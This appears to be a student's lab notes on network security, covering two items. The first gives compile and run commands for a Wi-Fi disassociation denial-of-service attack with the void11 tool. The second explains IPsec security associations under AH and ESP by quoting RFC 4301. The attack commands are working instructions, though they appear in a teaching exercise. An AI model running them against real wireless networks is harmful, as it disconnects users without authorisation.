**20- Implement the DOS attack - Disassociation Attack.** 

>Download void11 and compile it. 
>
>![image-20230424162817616](/Users/jack/Library/Application Support/typora-user-images/image-20230424162817616.png)
>
>```shell
>make HOSTAPD_PATH=[PATH_TO_HOSTAPD] <FLAGS> (find flags in :: subdirs ::)
>```
>
>Do single large dos:
>
>```shell
>iwconfig wlan0 mode master
>./void11_penetration -D -B 00:02:01:02:03:04 wlan0
>```

**21- Research and explain how security associations work when both AH and ESP are applied**

>According to [section 4.1 of *Security Architecture for IP*](https://www.rfc-editor.org/rfc/pdfrfc/rfc4301.txt.pdf): If both AH and ESP protection are applied to a traffic stream, then two SAs must be created and coordinated to effect protection through iterated application of the security protocols. 

